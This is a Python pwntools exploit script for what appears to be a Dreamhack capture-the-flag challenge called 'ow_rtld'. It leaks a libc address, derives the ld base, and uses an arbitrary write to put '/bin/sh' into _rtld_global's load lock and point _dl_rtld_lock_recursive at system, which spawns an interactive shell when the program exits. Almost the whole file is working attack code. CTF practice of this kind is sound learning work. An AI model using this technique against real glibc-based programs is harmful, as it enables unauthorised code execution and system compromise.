#!/usr/bin/python3

from pwn import *

exe = ELF('ow_rtld_patched', checksec=False)
libc = ELF('libc-2.27.so_18.04.3', checksec=False)
ld = ELF('ld-2.27.so', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main +101

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('host3.dreamhack.games', 13966)
else:
    p = process(exe.path)

GDB()
p.recvuntil(b'stdout: ')
libc_leak = int(p.recv(14), 16)
libc.address = libc_leak - 0x3ec760
info("libc base: " + hex(libc.address))

ld.address = libc.address + 0x3f1000
info("ld base: " + hex(ld.address))

sla(b"> ", b'1')
# _dl_load_lock
payload = (ld.sym['_rtld_global'] + 2312)
sla(b"addr: ", str(payload))

payload = u64('/bin/sh\0')
sla(b"data: ", str(payload))

sla(b"> ", b'1')
# _dl_rtld_lock_recursive
payload = (ld.sym['_rtld_global'] + 3840)
sla(b"addr: ", str(payload))

payload = libc.sym["system"]
sla(b"data: ", str(payload))

sla(b"> ", b'0')
p.interactive()
